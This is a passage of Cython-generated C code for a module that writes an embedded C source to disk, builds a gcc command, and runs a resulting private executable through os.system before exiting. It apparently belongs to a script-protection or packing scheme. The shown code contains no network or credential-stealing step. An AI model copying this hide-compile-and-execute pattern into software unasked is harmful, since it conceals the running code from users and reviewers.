  #if PY_MAJOR_VERSION < 3 && (__PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT)
  if (__Pyx_init_sys_getdefaultencoding_params() < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  #endif
  if (__pyx_module_is_main_source) {
    if (PyObject_SetAttr(__pyx_m, __pyx_n_s_name, __pyx_n_s_main) < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  }
  #if PY_MAJOR_VERSION >= 3
  {
    PyObject *modules = PyImport_GetModuleDict(); if (unlikely(!modules)) __PYX_ERR(0, 5, __pyx_L1_error)
    if (!PyDict_GetItemString(modules, "source")) {
      if (unlikely(PyDict_SetItemString(modules, "source", __pyx_m) < 0)) __PYX_ERR(0, 5, __pyx_L1_error)
    }
  }
  #endif
  /*--- Builtin init code ---*/
  if (__Pyx_InitCachedBuiltins() < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  /*--- Constants init code ---*/
  if (__Pyx_InitCachedConstants() < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  /*--- Global type/function init code ---*/
  (void)__Pyx_modinit_global_init_code();
  (void)__Pyx_modinit_variable_export_code();
  (void)__Pyx_modinit_function_export_code();
  (void)__Pyx_modinit_type_init_code();
  (void)__Pyx_modinit_type_import_code();
  (void)__Pyx_modinit_variable_import_code();
  (void)__Pyx_modinit_function_import_code();
  /*--- Execution code ---*/
  #if defined(__Pyx_Generator_USED) || defined(__Pyx_Coroutine_USED)
  if (__Pyx_patch_abc() < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  #endif

  
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_os, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_os, __pyx_t_1) < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_sys, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 6, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_sys, __pyx_t_1) < 0) __PYX_ERR(0, 6, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_PSH_TEAM_KEY, __pyx_kp_u_) < 0) __PYX_ERR(0, 8, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_EXECUTE_FILE, __pyx_kp_u_PY_PRIVATE_20240909130916210) < 0) __PYX_ERR(0, 10, __pyx_L1_error)

  
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_sys); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 11, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_prefix); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 11, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_PREFIX, __pyx_t_2) < 0) __PYX_ERR(0, 11, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_PREFIX); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 12, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_1 = PyNumber_Add(__pyx_kp_u_export_PYTHONHOME, __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 12, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_EXPORT_PYTHONHOME, __pyx_t_1) < 0) __PYX_ERR(0, 12, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_sys); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 13, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_executable); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 13, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = PyNumber_Add(__pyx_kp_u_export_PYTHON_EXECUTABLE, __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 13, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_EXPORT_PYTHON_EXECUTABLE, __pyx_t_1) < 0) __PYX_ERR(0, 13, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_EXECUTE_FILE); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 15, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = PyNumber_Add(__pyx_kp_u__2, __pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 15, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_RUN, __pyx_t_2) < 0) __PYX_ERR(0, 15, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_os); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 17, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_path); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 17, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_isfile); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 17, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_EXECUTE_FILE); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 17, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_3 = __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 17, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_4 = __Pyx_PyObject_IsTrue(__pyx_t_3); if (unlikely(__pyx_t_4 < 0)) __PYX_ERR(0, 17, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  if (__pyx_t_4) {

    
    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_os); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 18, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_system); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 18, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_EXPORT_PYTHONHOME); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 18, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_2 = PyNumber_Add(__pyx_t_3, __pyx_kp_u__3); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 18, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_EXPORT_PYTHON_EXECUTABLE); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 18, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_5 = PyNumber_Add(__pyx_t_2, __pyx_t_3); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 18, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __pyx_t_3 = PyNumber_Add(__pyx_t_5, __pyx_kp_u__3); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 18, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_RUN); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 18, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __pyx_t_2 = PyNumber_Add(__pyx_t_3, __pyx_t_5); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 18, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    __pyx_t_5 = __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_t_2); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 18, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

    
    __pyx_t_5 = __Pyx_PyObject_Call(__pyx_builtin_exit, __pyx_tuple__4, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 19, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

    
  }

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_C_SOURCE, __pyx_kp_u_ifndef_PY_SSIZE_T_CLEAN_define) < 0) __PYX_ERR(0, 21, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_C_FILE, __pyx_kp_u_py_private_c) < 0) __PYX_ERR(0, 4430, __pyx_L1_error)

  
  __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_sys); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 4431, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_version); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 4431, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_split); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 4431, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_5, __pyx_tuple__7, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 4431, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __pyx_t_5 = __Pyx_GetItemInt(__pyx_t_2, 0, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 4431, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_split); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 4431, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __pyx_t_5 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_tuple__8, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 4431, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_GetSlice(__pyx_t_5, 0, -1L, NULL, NULL, &__pyx_slice__9, 0, 1, 1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 4431, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __pyx_t_5 = PyUnicode_Join(__pyx_kp_u__5, __pyx_t_2); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 4431, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_PYTHON_VERSION, __pyx_t_5) < 0) __PYX_ERR(0, 4431, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_PREFIX); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 4434, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);

  
  __pyx_t_2 = PyNumber_Add(__pyx_kp_u_gcc_I, __pyx_t_5); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 4433, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

  
  __pyx_t_5 = PyNumber_Add(__pyx_t_2, __pyx_kp_u_include_python); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 4434, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_PYTHON_VERSION); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 4436, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);

  
  __pyx_t_1 = PyNumber_Add(__pyx_t_5, __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 4435, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = PyNumber_Add(__pyx_t_1, __pyx_kp_u_o); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 4436, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_EXECUTE_FILE); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 4438, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);

  
  __pyx_t_5 = PyNumber_Add(__pyx_t_2, __pyx_t_1); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 4437, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyNumber_Add(__pyx_t_5, __pyx_kp_u__6); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 4438, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_C_FILE); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 4440, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);

  
  __pyx_t_2 = PyNumber_Add(__pyx_t_1, __pyx_t_5); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 4439, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

  
  __pyx_t_5 = PyNumber_Add(__pyx_t_2, __pyx_kp_u_L); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 4440, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_PREFIX); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 4442, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);

  
  __pyx_t_1 = PyNumber_Add(__pyx_t_5, __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 4441, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = PyNumber_Add(__pyx_t_1, __pyx_kp_u_lib_lpython); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 4442, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_PYTHON_VERSION); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 4444, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);

  
  __pyx_t_5 = PyNumber_Add(__pyx_t_2, __pyx_t_1); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 4443, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_COMPILE_FILE, __pyx_t_5) < 0) __PYX_ERR(0, 4432, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

  
  /*with:*/ {
    __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_C_FILE); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 4448, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __pyx_t_1 = PyTuple_New(2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 4448, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_GIVEREF(__pyx_t_5);
    PyTuple_SET_ITEM(__pyx_t_1, 0, __pyx_t_5);
    __Pyx_INCREF(__pyx_n_u_w);
    __Pyx_GIVEREF(__pyx_n_u_w);
    PyTuple_SET_ITEM(__pyx_t_1, 1, __pyx_n_u_w);
    __pyx_t_5 = 0;
    __pyx_t_5 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_t_1, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 4448, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __pyx_t_6 = __Pyx_PyObject_LookupSpecial(__pyx_t_5, __pyx_n_s_exit_2); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 4448, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __pyx_t_1 = __Pyx_PyObject_LookupSpecial(__pyx_t_5, __pyx_n_s_enter); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 4448, __pyx_L3_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_2 = __Pyx_PyObject_CallNoArg(__pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 4448, __pyx_L3_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __pyx_t_1 = __pyx_t_2;
    __pyx_t_2 = 0;
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    /*try:*/ {
      {
        __Pyx_PyThreadState_declare
        __Pyx_PyThreadState_assign
        __Pyx_ExceptionSave(&__pyx_t_7, &__pyx_t_8, &__pyx_t_9);
        __Pyx_XGOTREF(__pyx_t_7);
        __Pyx_XGOTREF(__pyx_t_8);
        __Pyx_XGOTREF(__pyx_t_9);
        /*try:*/ {
          if (PyDict_SetItem(__pyx_d, __pyx_n_s_f, __pyx_t_1) < 0) __PYX_ERR(0, 4448, __pyx_L7_error)
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

          
          __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_f); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 4449, __pyx_L7_error)
          __Pyx_GOTREF(__pyx_t_1);
          __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_write); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 4449, __pyx_L7_error)
          __Pyx_GOTREF(__pyx_t_5);
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
          __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_C_SOURCE); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 4449, __pyx_L7_error)
          __Pyx_GOTREF(__pyx_t_1);
          __pyx_t_2 = __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 4449, __pyx_L7_error)
          __Pyx_GOTREF(__pyx_t_2);
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
          __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

          
        }
        __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
        __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
        __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
        goto __pyx_L12_try_end;
        __pyx_L7_error:;
        __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
        __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
        __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
        __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
        /*except:*/ {
          __Pyx_AddTraceback("source", __pyx_clineno, __pyx_lineno, __pyx_filename);
          if (__Pyx_GetException(&__pyx_t_2, &__pyx_t_1, &__pyx_t_5) < 0) __PYX_ERR(0, 4448, __pyx_L9_except_error)
          __Pyx_GOTREF(__pyx_t_2);
          __Pyx_GOTREF(__pyx_t_1);
          __Pyx_GOTREF(__pyx_t_5);
          __pyx_t_3 = PyTuple_Pack(3, __pyx_t_2, __pyx_t_1, __pyx_t_5); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 4448, __pyx_L9_except_error)
          __Pyx_GOTREF(__pyx_t_3);
          __pyx_t_10 = __Pyx_PyObject_Call(__pyx_t_6, __pyx_t_3, NULL);
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
          if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 4448, __pyx_L9_except_error)
          __Pyx_GOTREF(__pyx_t_10);
          __pyx_t_4 = __Pyx_PyObject_IsTrue(__pyx_t_10);
          __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
          if (__pyx_t_4 < 0) __PYX_ERR(0, 4448, __pyx_L9_except_error)
          __pyx_t_11 = ((!(__pyx_t_4 != 0)) != 0);
          if (__pyx_t_11) {
            __Pyx_GIVEREF(__pyx_t_2);
            __Pyx_GIVEREF(__pyx_t_1);
            __Pyx_XGIVEREF(__pyx_t_5);
            __Pyx_ErrRestoreWithState(__pyx_t_2, __pyx_t_1, __pyx_t_5);
            __pyx_t_2 = 0; __pyx_t_1 = 0; __pyx_t_5 = 0; 
            __PYX_ERR(0, 4448, __pyx_L9_except_error)
          }
          __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
          __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
          __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
          goto __pyx_L8_exception_handled;
        }
        __pyx_L9_except_error:;
        __Pyx_XGIVEREF(__pyx_t_7);
        __Pyx_XGIVEREF(__pyx_t_8);
        __Pyx_XGIVEREF(__pyx_t_9);
        __Pyx_ExceptionReset(__pyx_t_7, __pyx_t_8, __pyx_t_9);
        goto __pyx_L1_error;
        __pyx_L8_exception_handled:;
        __Pyx_XGIVEREF(__pyx_t_7);
        __Pyx_XGIVEREF(__pyx_t_8);
        __Pyx_XGIVEREF(__pyx_t_9);
        __Pyx_ExceptionReset(__pyx_t_7, __pyx_t_8, __pyx_t_9);
        __pyx_L12_try_end:;
      }
    }
    /*finally:*/ {
      /*normal exit:*/{
        if (__pyx_t_6) {
          __pyx_t_9 = __Pyx_PyObject_Call(__pyx_t_6, __pyx_tuple__10, NULL);
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
          if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 4448, __pyx_L1_error)
          __Pyx_GOTREF(__pyx_t_9);
          __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
        }
        goto __pyx_L6;
      }
      __pyx_L6:;
    }
    goto __pyx_L16;
    __pyx_L3_error:;
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
    goto __pyx_L1_error;
    __pyx_L16:;
  }

  
  __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_os); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 4451, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_makedirs); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 4451, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_os); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 4451, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_path); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 4451, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_dirname); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 4451, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_EXECUTE_FILE); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 4451, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 4451, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = PyTuple_New(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 4451, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_GIVEREF(__pyx_t_3);
  PyTuple_SET_ITEM(__pyx_t_2, 0, __pyx_t_3);
  __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 4451, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_exist_ok, Py_True) < 0) __PYX_ERR(0, 4451, __pyx_L1_error)
  __pyx_t_5 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_t_2, __pyx_t_3); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 4451, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
